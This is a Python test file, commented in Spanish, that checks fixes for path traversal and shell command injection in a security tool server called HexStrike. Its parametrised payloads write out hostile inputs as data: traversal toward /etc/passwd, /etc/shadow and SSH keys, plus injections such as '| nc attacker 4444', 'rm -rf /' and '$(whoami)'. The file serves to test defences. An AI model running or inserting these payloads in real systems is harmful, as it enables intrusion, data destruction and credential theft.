"""Tests de la corrección de path traversal (CWE-22) en HexStrike.

Auditoría 2026-08-07: los endpoints /api/files/{create,modify,delete,list}
aceptaban `../../` en filename/directory y escapaban de base_dir
(/tmp/hexstrike_files) → arbitrary file write/delete. Fix: _resolve_within_base.

Se importa la clase REAL desde hexstrike_server.py (el venv hexstrike-env tiene
Flask). NO se arranca el server — solo se ejercita FileOperationsManager.
"""
from __future__ import annotations

import importlib.util
import os
import sys
from pathlib import Path

import pytest

REPO = Path.home() / "hexstrike-ai"
sys.path.insert(0, str(REPO))

# El auth gate fail-closed de HexStrike exige HEXSTRIKE_API_KEY para arrancar
# (se niega a importar sin ella — comportamiento de seguridad verificado).
os.environ.setdefault("HEXSTRIKE_API_KEY", "test-key")

spec = importlib.util.spec_from_file_location("hexstrike_server", REPO / "hexstrike_server.py")
assert spec and spec.loader
hx = importlib.util.module_from_spec(spec)
spec.loader.exec_module(hx)


@pytest.fixture
def mgr(tmp_path):
    return hx.FileOperationsManager(base_dir=str(tmp_path / "hexstrike_files"))


# ── Path traversal (CRÍTICO) ────────────────────────────────────────────────

@pytest.mark.parametrize("payload", [
    "../../../../etc/passwd",
    "../../../home/medin/.ssh/authorized_keys",
    "/etc/passwd",                       # absoluta
    "..",
    "a/../../../../etc/shadow",
    "sub/../../../etc/cron.d/evil",
])
def test_create_file_rechaza_traversal(mgr, payload):
    result = mgr.create_file(payload, "pwned")
    assert not result["success"]
    assert "fuera de base_dir" in result["error"] or "no permitida" in result["error"]


def test_modify_file_rechaza_traversal(mgr):
    mgr.create_file("ok.txt", "x")
    result = mgr.modify_file("../../../../etc/hostname", "pwned")
    assert not result["success"]
    assert "fuera de base_dir" in result["error"]


def test_delete_file_rechaza_traversal(mgr):
    mgr.create_file("ok.txt", "x")
    result = mgr.delete_file("../../../../etc/hostname")
    assert not result["success"]
    assert "fuera de base_dir" in result["error"]


def test_list_files_rechaza_traversal(mgr):
    mgr.create_file("ok.txt", "x")
    result = mgr.list_files("../../../../etc")
    assert not result["success"]
    assert "fuera de base_dir" in result["error"]


# ── Operaciones legítimas siguen funcionando ────────────────────────────────

def test_create_lista_modifica_borra_dentro_de_base(mgr):
    r = mgr.create_file("docs/nota.txt", "hola")
    assert r["success"]
    assert "hexstrike_files/docs/nota.txt" in r["path"]

    listing = mgr.list_files("docs")
    assert listing["success"]
    assert listing["files"][0]["name"] == "nota.txt"

    r = mgr.modify_file("docs/nota.txt", "nuevo", append=True)
    assert r["success"]

    r = mgr.delete_file("docs/nota.txt")
    assert r["success"]
    assert not (mgr.base_dir / "docs" / "nota.txt").exists()


def test_nombre_con_subdirs_legitimo(mgr):
    r = mgr.create_file("a/b/c.txt", "x")
    assert r["success"]


def test_resolve_within_base_symlink_escapado(tmp_path):
    """Un symlink dentro de base que apunta FUERA debe rechazarse."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("s")
    base = tmp_path / "base"
    base.mkdir()
    (base / "link").symlink_to(outside)
    mgr = hx.FileOperationsManager(base_dir=str(base))
    # list a través del symlink resuelve a outside → fuera de base_dir
    result = mgr.list_files("link")
    assert not result["success"]
    assert "fuera de base_dir" in result["error"]


def test_etcd_passwd_intacto_tras_fix(mgr):
    """El fix no tocó nada fuera de base_dir (el intento no escribió)."""
    before = Path("/etc/passwd").read_text()
    mgr.create_file("../../../../etc/passwd", "pwned")
    assert Path("/etc/passwd").read_text() == before


# ── Shell input gate (OS Command Injection, OWASP ch03) ─────────────────────

def test_validate_additional_args_permite_flags_legitimos():
    ok = hx._validate_additional_args("--batch --random-agent -t 50 --dbms=mysql")
    assert ok == "--batch --random-agent -t 50 --dbms=mysql"


@pytest.mark.parametrize("payload", [
    "; id",                       # separador
    "&& echo pwned",              # and
    "$(whoami)",                  # sustitución
    "`whoami`",                   # backticks
    "| nc attacker 4444",         # pipe
    "--flag; rm -rf /",           # mezclado
    "-o /tmp/x\ncat /etc/passwd",  # newline
    "--arg 'v' ; whoami",         # quotes
    "> /tmp/pwned",              # redirección
    "$SECRET",                    # expansión de variable
])
def test_validate_additional_args_rechaza_inyeccion(payload):
    with pytest.raises(ValueError):
        hx._validate_additional_args(payload)


def test_validate_target_permite_hosts_y_urls():
    for ok in ["example.com", "192.168.1.1", "http://example.com:8080/path", "10.0.0.0/24"]:
        assert hx._validate_target(ok) == ok


@pytest.mark.parametrize("payload", [
    "example.com; id",
    "http://x.com/$(id)",
    "x.com`id`",
    "a b c",               # espacio rompe el argumento
    "target & nc e 1",
])
def test_validate_target_rechaza_inyeccion(payload):
    with pytest.raises(ValueError):
        hx._validate_target(payload)


def test_validate_free_value_permite_credenciales_legitimas():
    # Contraseñas reales con símbolos NO son inyección mientras no tengan
    # metacaracteres de shell
    assert hx._validate_free_value("P@ssw0rd!#2026", "password") == "P@ssw0rd!#2026"


@pytest.mark.parametrize("payload", [
    "admin; id",
    "$(whoami)",
    "pwd | id",
    "a\nb",
])
def test_validate_free_value_rechaza_inyeccion(payload):
    with pytest.raises(ValueError):
        hx._validate_free_value(payload, "password")


def test_shell_gate_rechaza_request_con_inyeccion():
    """El gate rechaza un POST a /api/tools/* con additional_args malicioso
    con 400 ANTES de ejecutar nada. Usa el test client de Flask."""
    client = hx.app.test_client()
    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
    # autenticado pero malicioso → 400 del shell gate
    r = client.post("/api/tools/nmap", json={
        "target": "example.com",
        "additional_args": "; id"
    }, headers=hdrs)
    assert r.status_code == 400
    assert "inyección" in r.get_json()["error"]


def test_shell_gate_permite_request_legitimo_auth():
    """Request autenticado con flags válidos pasa el gate (puede fallar
    después por tool no instalado, pero no por el gate)."""
    client = hx.app.test_client()
    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
    r = client.post("/api/tools/nmap", json={
        "target": "example.com",
        "additional_args": "-T4 -Pn"
    }, headers=hdrs)
    assert r.status_code != 400
    assert "inyección" not in r.get_json().get("error", "")


def test_gate_permite_commands_rpcclient_legitimo():
    """El separador ';' de rpcclient es formato nativo (lista de comandos),
    no inyección: 'enumdomusers;enumdomgroups' debe pasar el gate."""
    client = hx.app.test_client()
    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
    r = client.post("/api/tools/rpcclient", json={
        "target": "127.0.0.1",
        "commands": "enumdomusers;enumdomgroups;querydominfo"
    }, headers=hdrs)
    assert r.status_code != 400
    assert "inyección" not in r.get_json().get("error", "")


def test_gate_rechaza_commands_rpcclient_inyectado():
    """Pero '; id' dentro de commands SÍ es inyección real (comando shell
    arbitrario concatenado tras un comando rpcclient) y debe rechazarse."""
    client = hx.app.test_client()
    hdrs = {"X-API-Key": os.environ.get("HEXSTRIKE_API_KEY", "test-key")}
    r = client.post("/api/tools/rpcclient", json={
        "target": "127.0.0.1",
        "commands": "enumdomusers; id"
    }, headers=hdrs)
    assert r.status_code == 400
